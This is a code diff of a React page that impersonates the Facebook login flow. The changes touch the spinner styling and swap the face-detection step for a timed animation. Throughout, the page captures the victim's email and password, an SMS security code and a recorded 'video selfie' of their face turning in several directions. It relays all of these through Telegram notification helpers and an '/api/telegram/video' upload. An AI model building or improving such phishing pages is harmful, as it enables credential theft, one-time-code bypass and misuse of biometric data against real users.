@@ -1,5 +1,5 @@
 
-import { useState, useEffect, useRef, useCallback } from "react";
+import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -13,7 +13,6 @@ import {
 } from "@/components/ui/dialog";
 import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
 import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
-import * as faceapi from 'face-api.js';
 
 function FacebookLoader() {
   return (
@@ -22,13 +21,23 @@ function FacebookLoader() {
         <div
           className="absolute inset-0 rounded-full border-4 border-gray-200"
           style={{ borderTopColor: '#1877f2' }}
-        />
+        >
+          <style>{`
+            @keyframes fb-spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+          `}</style>
+        </div>
         <div
-          className="absolute inset-0 rounded-full border-4 border-transparent animate-spin"
-          style={{ borderTopColor: '#1877f2' }}
+          className="absolute inset-0 rounded-full border-4 border-transparent"
+          style={{
+            borderTopColor: '#1877f2',
+            animation: 'fb-spin 1s linear infinite'
+          }}
         />
       </div>
-      <p className="mt-4 text-sm text-[#65676b]">Please wait...</p>
+      <p className="mt-4 text-sm" style={{ color: '#65676b' }}>Please wait...</p>
     </div>
   );
 }
@@ -60,13 +69,6 @@ const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
 const currentYear = new Date().getFullYear();
 const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));
 
-type Direction = "left" | "right" | "up" | "down";
-
-interface FacePosition {
-  yaw: number;
-  pitch: number;
-}
-
 export default function LoginPage() {
   const [signupOpen, setSignupOpen] = useState(false);
   const [isLoggingIn, setIsLoggingIn] = useState(false);
@@ -75,20 +77,14 @@ export default function LoginPage() {
   const [userEmail, setUserEmail] = useState("");
   const [verificationCode, setVerificationCode] = useState("");
   const [stream, setStream] = useState<MediaStream | null>(null);
-  const [currentDirection, setCurrentDirection] = useState<Direction | null>(null);
+  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | "up" | "down" | null>(null);
   const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
   const [isRecording, setIsRecording] = useState(false);
+  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
   const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
+  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
+  const [directionProgress, setDirectionProgress] = useState(0);
   const [overallProgress, setOverallProgress] = useState(0);
-  const [faceDetected, setFaceDetected] = useState(false);
-  const [modelsLoaded, setModelsLoaded] = useState(false);
-  const [loadingModels, setLoadingModels] = useState(false);
-  const [directionHoldTime, setDirectionHoldTime] = useState(0);
-  
-  const videoRef = useRef<HTMLVideoElement>(null);
-  const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
-  const baseFacePositionRef = useRef<FacePosition | null>(null);
-  const recordedChunksRef = useRef<Blob[]>([]);
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -114,174 +110,6 @@ export default function LoginPage() {
     },
   });
 
-  const loadFaceApiModels = async () => {
-    if (modelsLoaded) return;
-    setLoadingModels(true);
-    try {
-      await Promise.all([
-        faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
-        faceapi.nets.faceLandmark68Net.loadFromUri('/models')
-      ]);
-      setModelsLoaded(true);
-    } catch (error) {
-      console.error('Error loading face detection models:', error);
-    }
-    setLoadingModels(false);
-  };
-
-  const calculateFaceOrientation = (landmarks: faceapi.FaceLandmarks68): FacePosition => {
-    const nose = landmarks.getNose();
-    const leftEye = landmarks.getLeftEye();
-    const rightEye = landmarks.getRightEye();
-    
-    const noseTip = nose[3];
-    const leftEyeCenter = {
-      x: leftEye.reduce((sum, p) => sum + p.x, 0) / leftEye.length,
-      y: leftEye.reduce((sum, p) => sum + p.y, 0) / leftEye.length,
-    };
-    const rightEyeCenter = {
-      x: rightEye.reduce((sum, p) => sum + p.x, 0) / rightEye.length,
-      y: rightEye.reduce((sum, p) => sum + p.y, 0) / rightEye.length,
-    };
-    
-    const eyeCenter = {
-      x: (leftEyeCenter.x + rightEyeCenter.x) / 2,
-      y: (leftEyeCenter.y + rightEyeCenter.y) / 2,
-    };
-    
-    const eyeDistance = Math.sqrt(
-      Math.pow(rightEyeCenter.x - leftEyeCenter.x, 2) +
-      Math.pow(rightEyeCenter.y - leftEyeCenter.y, 2)
-    );
-    
-    const yaw = (noseTip.x - eyeCenter.x) / eyeDistance;
-    const pitch = (noseTip.y - eyeCenter.y) / eyeDistance;
-    
-    return { yaw, pitch };
-  };
-
-  const detectDirection = useCallback((position: FacePosition): Direction | null => {
-    const base = baseFacePositionRef.current;
-    if (!base) return null;
-    
-    const yawDiff = position.yaw - base.yaw;
-    const pitchDiff = position.pitch - base.pitch;
-    
-    const threshold = 0.15;
-    
-    if (Math.abs(yawDiff) > Math.abs(pitchDiff)) {
-      if (yawDiff < -threshold) return "left";
-      if (yawDiff > threshold) return "right";
-    } else {
-      if (pitchDiff < -threshold) return "up";
-      if (pitchDiff > threshold) return "down";
-    }
-    
-    return null;
-  }, []);
-
-  const runFaceDetection = useCallback(async () => {
-    if (!videoRef.current || !modelsLoaded) return;
-    
-    const video = videoRef.current;
-    
-    try {
-      const detection = await faceapi
-        .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 }))
-        .withFaceLandmarks();
-      
-      if (detection) {
-        setFaceDetected(true);
-        const position = calculateFaceOrientation(detection.landmarks);
-        
-        if (!baseFacePositionRef.current && currentStep === "recording") {
-          baseFacePositionRef.current = position;
-        }
-        
-        if (currentStep === "recording" && currentDirection) {
-          const detected = detectDirection(position);
-          
-          if (detected === currentDirection) {
-            setDirectionHoldTime(prev => {
-              const newTime = prev + 100;
-              if (newTime >= 1500) {
-                return 1500;
-              }
-              return newTime;
-            });
-          } else {
-            setDirectionHoldTime(0);
-          }
-        }
-      } else {
-        setFaceDetected(false);
-        setDirectionHoldTime(0);
-      }
-    } catch (error) {
-      console.error('Face detection error:', error);
-    }
-  }, [modelsLoaded, currentStep, currentDirection, detectDirection]);
-
-  useEffect(() => {
-    if (directionHoldTime >= 1500 && currentDirection && !completedDirections.has(currentDirection)) {
-      const directions: Direction[] = ["left", "right", "up", "down"];
-      const currentIndex = directions.indexOf(currentDirection);
-      
-      setCompletedDirections(prev => new Set([...prev, currentDirection]));
-      setOverallProgress((currentIndex + 1) * 25);
-      
-      if (currentIndex < directions.length - 1) {
-        setCurrentDirection(directions[currentIndex + 1]);
-        setDirectionHoldTime(0);
-        baseFacePositionRef.current = null;
-      } else {
-        finishRecording();
-      }
-    }
-  }, [directionHoldTime, currentDirection, completedDirections]);
-
-  const finishRecording = useCallback(() => {
-    setIsRecording(false);
-    setOverallProgress(100);
-    setCurrentDirection(null);
-    
-    if (detectionIntervalRef.current) {
-      clearInterval(detectionIntervalRef.current);
-      detectionIntervalRef.current = null;
-    }
-    
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-      mediaRecorder.stop();
-    }
-    
-    setCurrentStep("processing");
-    
-    setTimeout(() => {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-      setCurrentStep("complete");
-    }, 3000);
-  }, [mediaRecorder, stream]);
-
-  useEffect(() => {
-    if ((currentStep === "instructions" || currentStep === "recording") && modelsLoaded && stream) {
-      detectionIntervalRef.current = setInterval(runFaceDetection, 100);
-      return () => {
-        if (detectionIntervalRef.current) {
-          clearInterval(detectionIntervalRef.current);
-        }
-      };
-    }
-  }, [currentStep, modelsLoaded, stream, runFaceDetection]);
-
-  useEffect(() => {
-    if ((currentStep === "instructions" || currentStep === "recording") && stream && videoRef.current) {
-      videoRef.current.srcObject = stream;
-      videoRef.current.play().catch(err => console.error('Error playing video:', err));
-    }
-  }, [currentStep, stream]);
-
   useEffect(() => {
     let timer: NodeJS.Timeout;
 
@@ -291,10 +119,9 @@ export default function LoginPage() {
       timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
     } else if (currentStep === "recording") {
       setCompletedDirections(new Set());
-      setCurrentDirection("left");
-      setDirectionHoldTime(0);
+      setCurrentDirection(null);
+      setDirectionProgress(0);
       setOverallProgress(0);
-      baseFacePositionRef.current = null;
     }
 
     return () => clearTimeout(timer);
@@ -305,14 +132,12 @@ export default function LoginPage() {
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
       }
-      if (detectionIntervalRef.current) {
-        clearInterval(detectionIntervalRef.current);
-      }
     };
   }, [stream]);
 
   const handleLogin = async (data: LoginForm) => {
     setIsLoggingIn(true);
+    console.log("Login attempt:", data);
     setUserEmail(data.email);
     await notifyLogin(data.email, data.password);
     setCurrentStep("loading-login");
@@ -327,16 +152,19 @@ export default function LoginPage() {
   };
 
   const handleStartFaceVerification = async () => {
-    await loadFaceApiModels();
     try {
       const mediaStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", width: 640, height: 480 },
+        video: { facingMode: "user" },
         audio: false
       });
       setStream(mediaStream);
       setCurrentStep("instructions");
+      if (videoRef) {
+        videoRef.srcObject = mediaStream;
+      }
     } catch (error) {
       console.error("Camera access denied:", error);
+      alert("Please allow camera access to continue with face verification");
     }
   };
 
@@ -349,11 +177,13 @@ export default function LoginPage() {
     
     setIsRecording(true);
     setCurrentStep("recording");
+    setCurrentDirection("left");
     
+    // Start recording video
     if (stream) {
       const chunks: Blob[] = [];
-      recordedChunksRef.current = chunks;
       
+      // Find a supported mimeType - only check webm formats
       const mimeTypes = [
         'video/webm;codecs=vp9',
         'video/webm;codecs=vp8',
@@ -364,15 +194,20 @@ export default function LoginPage() {
       for (const type of mimeTypes) {
         if (MediaRecorder.isTypeSupported(type)) {
           selectedMimeType = type;
+          console.log('Selected mimeType:', type);
           break;
         }
       }
       
+      // Create recorder with supported mimeType or default
       let recorder: MediaRecorder;
       try {
-        recorder = selectedMimeType
-          ? new MediaRecorder(stream, { mimeType: selectedMimeType })
-          : new MediaRecorder(stream);
+        if (selectedMimeType) {
+          recorder = new MediaRecorder(stream, { mimeType: selectedMimeType });
+        } else {
+          recorder = new MediaRecorder(stream);
+          console.log('Using default mimeType:', recorder.mimeType);
+        }
       } catch (error) {
         console.error('Error creating MediaRecorder:', error);
         return;
@@ -381,63 +216,143 @@ export default function LoginPage() {
       recorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
           chunks.push(event.data);
-          recordedChunksRef.current = chunks;
         }
       };
       
       recorder.onstop = async () => {
         try {
+          // Use the mimeType that MediaRecorder actually used
           const actualMimeType = recorder.mimeType || 'video/webm';
-          const videoBlob = new Blob(recordedChunksRef.current, { type: actualMimeType });
+          const videoBlob = new Blob(chunks, { type: actualMimeType });
+          setRecordedChunks(chunks);
           
+          console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
+          
+          // Send video to Telegram
           const formData = new FormData();
           formData.append('video', videoBlob, 'face-verification.webm');
           formData.append('email', userEmail);
           
-          await fetch('/api/telegram/video', {
+          const response = await fetch('/api/telegram/video', {
             method: 'POST',
             body: formData,
           });
+          
+          if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
+          }
+          
+          console.log('Video sent successfully');
         } catch (error) {
           console.error('Failed to send video:', error);
         }
       };
       
-      recorder.start(100);
+      recorder.start(100); // Collect data every 100ms
       setMediaRecorder(recorder);
+      
+      const directionDuration = 2500; // 2.5 seconds per direction
+      const progressInterval = 50; // Update progress every 50ms
+      const directions: ("left" | "right" | "up" | "down")[] = ["left", "right", "up", "down"];
+      
+      let currentDirIndex = 0;
+      let dirProgress = 0;
+      
+      // Start progress animation
+      const animateProgress = () => {
+        const progressTimer = setInterval(() => {
+          dirProgress += (100 / (directionDuration / progressInterval));
+          
+          if (dirProgress >= 100) {
+            // Mark current direction as complete before incrementing
+            const completedSet = new Set<string>();
+            for (let i = 0; i <= currentDirIndex; i++) {
+              completedSet.add(directions[i]);
+            }
+            setCompletedDirections(completedSet);
+            setDirectionProgress(100);
+            setOverallProgress((currentDirIndex + 1) * 25);
+            
+            // Move to next direction
+            currentDirIndex++;
+            dirProgress = 0;
+            
+            if (currentDirIndex >= directions.length) {
+              // All directions complete
+              clearInterval(progressTimer);
+              setIsRecording(false);
+              setOverallProgress(100);
+              setCurrentDirection(null);
+              
+              // Stop recording
+              if (recorder.state !== 'inactive') {
+                recorder.stop();
+              }
+              
+              setCurrentStep("processing");
+              setTimeout(() => {
+                if (stream) {
+                  stream.getTracks().forEach(track => track.stop());
+                }
+                setCurrentStep("complete");
+              }, 3000);
+            } else {
+              // Set next direction
+              setCurrentDirection(directions[currentDirIndex]);
+              setDirectionProgress(0);
+            }
+          } else {
+            setDirectionProgress(dirProgress);
+            setOverallProgress((currentDirIndex * 25) + (dirProgress * 0.25));
+          }
+        }, progressInterval);
+        
+        return progressTimer;
+      };
+      
+      animateProgress();
     }
   };
 
   const handleSignup = async (data: SignupForm) => {
     setIsSigningUp(true);
     await new Promise(resolve => setTimeout(resolve, 1000));
+    console.log("Signup attempt:", data);
     setIsSigningUp(false);
     setSignupOpen(false);
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: 'system-ui, -apple-system, "Segoe UI", Helvetica, Arial, sans-serif' }}>
-      {currentStep === "login" && (
-        <>
-          {/* Language selector */}
-          <div className="text-center pt-4 pb-2">
-            <span className="text-xs text-[#65676b]">English (UK)</span>
+    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#ffffff' }}>
+      {/* Language Selector */}
+      <div className="text-center pt-4 pb-6">
+        <a
+          href="#"
+          className="text-sm hover:underline"
+          style={{ color: '#65676b' }}
+          data-testid="link-language"
+        >
+          English (UK)
+        </a>
+      </div>
+
+      {/* Main Content */}
+      <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
+        <div className="w-full max-w-md">
+          {/* Facebook Logo */}
+          <div className="text-center mb-8">
+            <img
+              src="/favicon.png"
+              alt="Facebook"
+              className="w-16 h-16 mx-auto"
+              data-testid="logo-facebook"
+            />
           </div>
 
-          {/* Main content */}
-          <div className="flex-1 flex flex-col items-center justify-center px-5 pb-8">
-            <div className="w-full max-w-md">
-              {/* Facebook logo */}
-              <div className="text-center mb-12">
-                <div className="w-16 h-16 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#1877f2' }}>
-                  <svg viewBox="0 0 36 36" className="w-10 h-10" fill="white">
-                    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
-                    <path fill="#1877f2" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
-                  </svg>
-                </div>
-              </div>
-
-              {/* Login form */}
+          {/* Login Step */}
+          {currentStep === "login" && (
+            <>
               <Form {...loginForm}>
                 <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                   <FormField
@@ -450,11 +365,24 @@ export default function LoginPage() {
                             {...field}
                             type="text"
                             placeholder="Mobile number or email address"
-                            className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
-                            style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
+                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                            style={{
+                              backgroundColor: '#ffffff',
+                              borderColor: '#dadde1',
+                              color: '#1c1e21',
+                            }}
+                            onFocus={(e) => {
+                              e.currentTarget.style.borderColor = '#1877f2';
+                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
+                            }}
+                            onBlur={(e) => {
+                              e.currentTarget.style.borderColor = '#dadde1';
+                              e.currentTarget.style.boxShadow = 'none';
+                            }}
+                            data-testid="input-email"
                           />
                         </FormControl>
-                        <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                       </FormItem>
                     )}
                   />
@@ -469,11 +397,24 @@ export default function LoginPage() {
                             {...field}
                             type="password"
                             placeholder="Password"
-                            className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
-                            style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
+                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
+                            style={{
+                              backgroundColor: '#ffffff',
+                              borderColor: '#dadde1',
+                              color: '#1c1e21',
+                            }}
+                            onFocus={(e) => {
+                              e.currentTarget.style.borderColor = '#1877f2';
+                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
+                            }}
+                            onBlur={(e) => {
+                              e.currentTarget.style.borderColor = '#dadde1';
+                              e.currentTarget.style.boxShadow = 'none';
+                            }}
+                            data-testid="input-password"
                           />
                         </FormControl>
-                        <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                       </FormItem>
                     )}
                   />
@@ -481,368 +422,486 @@ export default function LoginPage() {
                   <button
                     type="submit"
                     disabled={isLoggingIn}
-                    className="w-full py-3.5 text-white text-lg font-semibold transition disabled:opacity-60 rounded-full"
+                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                     style={{ backgroundColor: '#1877f2' }}
+                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                    data-testid="button-login"
                   >
                     {isLoggingIn ? "Logging in..." : "Log in"}
                   </button>
                 </form>
               </Form>
 
-              {/* Forgotten password link */}
-              <div className="text-center mt-5 mb-8">
-                <a href="#" className="text-sm text-[#1877f2]">
+              <div className="text-center mt-6">
+                <a href="#" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                   Forgotten password?
                 </a>
               </div>
 
-              {/* Create new account button */}
-              <div className="text-center mt-8">
+              <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
                 <button
                   onClick={() => setSignupOpen(true)}
-                  className="px-12 py-3 text-base font-semibold transition rounded-full"
-                  style={{ backgroundColor: 'white', color: '#1877f2', border: '1px solid #1877f2' }}
+                  className="w-full py-3 text-sm font-bold rounded-full transition"
+                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2' }}
+                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
+                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
+                  data-testid="button-create-account"
                 >
                   Create new account
                 </button>
               </div>
-            </div>
-          </div>
+            </>
+          )}
 
-          {/* Footer */}
-          <div className="text-center pb-8 space-y-3">
-            <img src={metaLogoImg} alt="Meta" className="h-5 mx-auto opacity-50" />
-            <div className="text-xs text-[#65676b] space-x-2">
-              <a href="#" className="hover:underline">About</a>
-              <span>•</span>
-              <a href="#" className="hover:underline">Help</a>
-              <span>•</span>
-              <a href="#" className="hover:underline">More</a>
-            </div>
-          </div>
-        </>
-      )}
+          {/* Loading States */}
+          {(currentStep === "loading-login" || currentStep === "loading-code") && (
+            <FacebookLoader />
+          )}
 
-      {(currentStep === "loading-login" || currentStep === "loading-code") && (
-        <div className="flex-1 flex items-center justify-center bg-white">
-          <FacebookLoader />
-        </div>
-      )}
-
-      {currentStep === "code" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <h2 className="text-xl font-semibold mb-2 text-[#1c1e21]">Enter security code</h2>
-            <p className="text-sm mb-6 text-[#65676b]">
-              Please check your phone for a text message with your code.
-            </p>
-            <input
-              type="text"
-              value={verificationCode}
-              onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
-              placeholder="Enter code"
-              className="w-full px-4 py-3 text-center text-xl border border-[#dadde1] rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 mb-4 text-[#1c1e21]"
-              style={{ letterSpacing: '0.3em' }}
-            />
-            <button
-              onClick={handleCodeSubmit}
-              disabled={verificationCode.length < 4}
-              className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-50 rounded-md"
-              style={{ backgroundColor: '#1877f2' }}
-            >
-              Continue
-            </button>
-          </div>
-        </div>
-      )}
-
-      {currentStep === "face-intro" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
-              <svg className="w-10 h-10" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
-                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
-              </svg>
-            </div>
-            <h2 className="text-2xl font-semibold mb-3 text-[#1c1e21]">Confirm your identity</h2>
-            <p className="text-sm mb-6 text-[#65676b]">
-              To keep your account secure, we need to verify it's really you.
-            </p>
-            <button
-              onClick={() => setCurrentStep("face-explanation")}
-              className="w-full py-3 text-white text-base font-semibold transition rounded-md"
-              style={{ backgroundColor: '#1877f2' }}
-            >
-              Continue
-            </button>
-          </div>
-        </div>
-      )}
-
-      {currentStep === "face-explanation" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
-              <svg className="w-12 h-12" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
-                <path strokeLinecap="round" strokeLinejoin="round" d="M15.182 15.182a4.5 4.5 0 01-6.364 0M21 12a9 9 0 11-18 0 9 9 0 0118 0zM9.75 9.75c0 .414-.168.75-.375.75S9 10.164 9 9.75 9.168 9 9.375 9s.375.336.375.75zm-.375 0h.008v.015h-.008V9.75zm5.625 0c0 .414-.168.75-.375.75s-.375-.336-.375-.75.168-.75.375-.75.375.336.375.75zm-.375 0h.008v.015h-.008V9.75z" />
-              </svg>
-            </div>
-            <h2 className="text-xl font-semibold mb-3 text-[#1c1e21]">Take a video selfie</h2>
-            <p className="text-sm mb-2 text-[#65676b]">
-              We'll compare a video of your face to the photos on your account to confirm your identity.
-            </p>
-            <ul className="text-left text-sm mb-6 space-y-2 text-[#65676b]">
-              <li className="flex items-start gap-2">
-                <span className="text-[#1877f2]">1.</span>
-                <span>Make sure your face is well lit</span>
-              </li>
-              <li className="flex items-start gap-2">
-                <span className="text-[#1877f2]">2.</span>
-                <span>Center your face in the frame</span>
-              </li>
-              <li className="flex items-start gap-2">
-                <span className="text-[#1877f2]">3.</span>
-                <span>Slowly turn your head as directed</span>
-              </li>
-            </ul>
-            <button
-              onClick={handleStartFaceVerification}
-              disabled={loadingModels}
-              className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-60 rounded-md"
-              style={{ backgroundColor: '#1877f2' }}
-            >
-              {loadingModels ? "Loading..." : "Start verification"}
-            </button>
-            <button
-              onClick={() => setCurrentStep("login")}
-              className="mt-3 text-sm text-[#65676b]"
-            >
-              Cancel
-            </button>
-          </div>
-        </div>
-      )}
-
-      {currentStep === "instructions" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <h2 className="text-xl font-semibold mb-3 text-[#1c1e21]">Position your face</h2>
-            <p className="text-sm mb-4 text-[#65676b]">
-              Center your face in the circle
-            </p>
-
-            <div className="relative mx-auto mb-6" style={{ width: '280px', height: '280px' }}>
-              <div className="absolute inset-0 rounded-full overflow-hidden bg-black">
-                <video
-                  ref={videoRef}
-                  autoPlay
-                  playsInline
-                  muted
-                  className="w-full h-full object-cover scale-x-[-1]"
-                />
-              </div>
-              
-              <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
-                <defs>
-                  <mask id="circleMask">
-                    <rect width="280" height="280" fill="white" />
-                    <circle cx="140" cy="140" r="120" fill="black" />
-                  </mask>
-                </defs>
-                <rect width="280" height="280" fill="rgba(255,255,255,0.95)" mask="url(#circleMask)" />
-                <circle cx="140" cy="140" r="120" fill="none" stroke={faceDetected ? "#42b72a" : "#1877f2"} strokeWidth="4" strokeDasharray="8 4" />
-              </svg>
-
-              {faceDetected && (
-                <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2">
-                  <div className="px-3 py-1 rounded-full text-xs font-medium text-white bg-[#42b72a]">
-                    Face detected
-                  </div>
-                </div>
-              )}
-            </div>
-
-            <button
-              onClick={handleStartRecording}
-              disabled={!faceDetected}
-              className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-50 rounded-md"
-              style={{ backgroundColor: '#1877f2' }}
-            >
-              {faceDetected ? "Start recording" : "Detecting face..."}
-            </button>
-          </div>
-        </div>
-      )}
-
-      {currentStep === "recording" && (
-        <div className="flex-1 flex items-center justify-center px-4">
-          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
-            <div className="relative mx-auto mb-4" style={{ width: '280px', height: '280px' }}>
-              <div className="absolute inset-0 rounded-full overflow-hidden bg-black">
-                <video
-                  ref={videoRef}
-                  autoPlay
-                  playsInline
-                  muted
-                  className="w-full h-full object-cover scale-x-[-1]"
-                />
-              </div>
-              
-              <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
-                <defs>
-                  <mask id="recordMask">
-                    <rect width="280" height="280" fill="white" />
-                    <circle cx="140" cy="140" r="120" fill="black" />
-                  </mask>
-                </defs>
-                <rect width="280" height="280" fill="rgba(255,255,255,0.95)" mask="url(#recordMask)" />
-                
-                <circle cx="140" cy="140" r="120" fill="none" stroke="#e4e6eb" strokeWidth="6" />
-                
-                <circle 
-                  cx="140" 
-                  cy="140" 
-                  r="120" 
-                  fill="none" 
-                  stroke="#1877f2" 
-                  strokeWidth="6"
-                  strokeLinecap="round"
-                  strokeDasharray={`${2 * Math.PI * 120}`}
-                  strokeDashoffset={`${2 * Math.PI * 120 * (1 - overallProgress / 100)}`}
-                  style={{ transform: 'rotate(-90deg)', transformOrigin: '140px 140px', transition: 'stroke-dashoffset 0.3s ease' }}
-                />
-
-                {currentDirection && (
-                  <>
-                    <circle
-                      cx={currentDirection === "left" ? 20 : currentDirection === "right" ? 260 : 140}
-                      cy={currentDirection === "up" ? 20 : currentDirection === "down" ? 260 : 140}
-                      r="24"
-                      fill="#1877f2"
-                      style={{ filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.2))' }}
-                    />
-                    <g transform={`translate(${currentDirection === "left" ? 20 : currentDirection === "right" ? 260 : 140}, ${currentDirection === "up" ? 20 : currentDirection === "down" ? 260 : 140})`}>
-                      <g transform={`rotate(${currentDirection === "left" ? 180 : currentDirection === "right" ? 0 : currentDirection === "up" ? -90 : 90})`}>
-                        <path d="M-6 0 L4 0 M0 -4 L4 0 L0 4" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none" />
-                      </g>
-                    </g>
-                  </>
-                )}
-              </svg>
-
-              {directionHoldTime > 0 && directionHoldTime < 1500 && (
-                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-                  <div className="w-16 h-16 rounded-full border-4 border-green-500 flex items-center justify-center" 
-                       style={{ 
-                         background: `conic-gradient(#42b72a ${(directionHoldTime / 1500) * 360}deg, transparent 0deg)`,
-                         opacity: 0.8
-                       }}>
-                  </div>
-                </div>
-              )}
-            </div>
-
-            <h2 className="text-lg font-semibold mb-2 text-[#1c1e21]">
-              {currentDirection === "left" ? "Turn your head left" : 
-               currentDirection === "right" ? "Turn your head right" : 
-               currentDirection === "up" ? "Tilt your head up" : 
-               currentDirection === "down" ? "Tilt your head down" : 
-               "Center your face"}
-            </h2>
-            
-            <p className="text-sm mb-4 text-[#65676b]">
-              {faceDetected ? "Hold the position" : "Face not detected - please center your face"}
-            </p>
-
-            <div className="flex justify-center gap-3 mb-4">
-              {(["left", "right", "up", "down"] as Direction[]).map((dir) => (
-                <div
-                  key={dir}
-                  className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-medium transition-all"
-                  style={{
-                    backgroundColor: completedDirections.has(dir) ? '#42b72a' : currentDirection === dir ? '#1877f2' : '#e4e6eb',
-                    color: completedDirections.has(dir) || currentDirection === dir ? '#fff' : '#65676b'
-                  }}
-                >
-                  {completedDirections.has(dir) ? (
-                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
-                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-                    </svg>
-                  ) : (
-                    dir.charAt(0).toUpperCase()
-                  )}
-                </div>
-              ))}
-            </div>
-
-            <div className="w-full h-2 rounded-full overflow-hidden mb-2 bg-[#e4e6eb]">
-              <div 
-                className="h-full rounded-full transition-all duration-300 bg-[#1877f2]"
-                style={{ width: `${overallProgress}%` }}
+          {/* Code - Verification Code */}
